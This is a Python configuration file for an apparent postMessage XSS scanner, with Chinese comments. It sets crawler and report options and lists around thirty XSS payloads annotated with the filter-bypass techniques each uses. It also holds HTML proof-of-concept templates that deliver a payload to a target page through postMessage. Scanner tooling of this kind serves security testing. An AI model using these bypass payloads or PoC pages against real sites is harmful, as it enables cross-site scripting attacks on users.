# config.py
import os

# 扫描核心配置
SCAN_CONFIG = {
    # 爬虫配置
    "max_depth": 3,  # 爬虫最大深度
    "max_threads": 5,  # 最大线程数
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "timeout": 10,  # 请求超时时间(秒)
    "follow_redirects": True,  # 是否跟随重定向
    "allowed_domains": [],  # 允许爬取的额外域名(默认只爬取起始域名)
    "exclude_paths": [],  # 排除的路径(正则表达式)

    # 动态渲染配置
    "enable_js_rendering": True,  # 启用JS动态渲染
    "js_render_delay": 3,  # JS渲染等待时间(秒)

    # 网络控制配置
    "request_delay": 1,  # 请求间隔(秒)
    "use_proxy": False,  # 是否使用代理
    "proxies": {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
    "ignore_ssl_errors": False,  # 忽略SSL证书错误

    # 漏洞验证配置
    "headless_mode": True,  # 浏览器无头模式
    "exploit_timeout": 5,  # 漏洞验证超时(秒)
}

# 报告配置
REPORT_CONFIG = {
    "output_dir": "reports",  # 报告输出目录
    "report_name": "postmessage_xss_scan",  # 报告名称前缀
    "format": "html",  # 报告格式(html/json/txt/pdf)
}

# XSS测试Payloads
# XSS测试Payloads - 扩展版
XSS_PAYLOADS = [
    # 一、基础标签+事件（最常用，多数网站对<script>过滤但易忽略事件）
    "<img src=x onerror=alert(1)>",  # 经典img+onerror，几乎所有浏览器支持
    "<img src='x' onerror='alert(1)'>",  # 带引号变体，适配属性内注入
    "<svg onload=alert(1)>",  # svg标签+onload，很多过滤器不拦截svg
    "<svg/onload=alert(1)>",  # 无空格变体，绕过简单空格检测
    "<body onload=alert(1)>",  # body标签事件，适合页面级注入
    "<div onmouseover=alert(1)>hover</div>",  # 交互触发，适合用户操作场景

    # 二、大小写绕过（针对只过滤小写标签/事件的网站）
    "<SCRIPT>alert(1)</SCRIPT>",  # 全大写标签
    "<sCrIpT>alert(1)</sCrIpT>",  # 混合大小写
    "<Img sRc=x OnErRoR=alert(1)>",  # 标签+事件混合大小写
    "<sVg OnLoAd=alert(1)>",  # svg标签大小写变体

    # 三、不常见但高兼容标签（很多过滤器未覆盖）
    "<details open ontoggle=alert(1)>",  # details标签（默认可展开）+ontoggle事件
    "<marquee onstart=alert(1)>",  # marquee滚动标签+onstart事件（IE/Chrome兼容）
    "<video src=x onerror=alert(1)>",  # 视频标签错误事件
    "<audio src=x onerror=alert(1)>",  # 音频标签错误事件
    "<isindex type=image src=1 onerror=alert(1)>",  # 冷门isindex标签（部分浏览器支持）

    # 四、伪协议+链接（适合href/src等属性注入）
    "<a href=javascript:alert(1)>click</a>",  # 经典a标签伪协议
    "<a href='javascript:alert(1)'>click</a>",  # 带引号变体
    "<iframe src=javascript:alert(1)>",  # iframe伪协议
    "<iframe src='javascript:alert(1)'>",  # 带引号变体

    # 五、编码绕过（针对简单字符过滤）
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",  # HTML实体编码alert
    "<img src=x onerror=alert&#40;1&#41;>",  # 括号实体编码
    "<svg onload=alert\u00281\u0029>",  # Unicode编码括号（\u0028=左括号，\u0029=右括号）
    "<img src=x onerror=alert\x281\x29>",  # 十六进制编码括号

    # 六、标签拆分绕过（针对完整标签匹配过滤）
    "<scri<script>pt>alert(1)</scri</script>pt>",  # 拆分<script>标签
    "<img src=x onerror=alert(1)><img",  # 不完整标签（利用浏览器容错性）
    "<svg><script>alert(1)</script></svg>",  # svg嵌套script（绕过外层过滤）

    # 七、属性污染（适合input/textarea等标签的value属性注入）
    "<input value=''><script>alert(1)</script>'",  # 闭合value属性后注入
    "<textarea>'></textarea><script>alert(1)</script>",  # 闭合textarea标签

    # 八、无标签XSS（适合JS变量/属性内注入）
    "';alert(1);//",  # 闭合单引号后执行（JS字符串内）
    '";alert(1);//',  # 闭合双引号后执行（JS字符串内）
    "javascript:alert(1)",  # 纯伪协议（适合href/src直接赋值场景）
]

# PostMessage利用模板
# config.py 中的 POC 模板配置
POSTMESSAGE_EXPLOIT_TEMPLATES = {
    "basic": """
<!DOCTYPE html>
<html>
<head>
    <title>PostMessage XSS POC</title>
</head>
<body>
<script>
// 向目标页面发送含XSS的postMessage
const target = window.open('{target_url}');
setTimeout(() => {{
    target.postMessage('{xss_payload}', '*'); // * 表示任意origin（模拟漏洞场景）
}}, 2000); // 等待页面加载完成
</script>
</body>
</html>
""",
    "iframe": """
<!DOCTYPE html>
<html>
<body>
<iframe id="targetFrame" src="{target_url}" width="800" height="600"></iframe>
<script>
// 通过iframe发送postMessage
const frame = document.getElementById('targetFrame');
frame.onload = () => {{
    frame.contentWindow.postMessage('{xss_payload}', '*');
}};
</script>
</body>
</html>
"""
}

# 确保输出目录存在
os.makedirs(REPORT_CONFIG["output_dir"], exist_ok=True)
os.makedirs(os.path.join(REPORT_CONFIG["output_dir"], "charts"), exist_ok=True)
os.makedirs("exploits", exist_ok=True)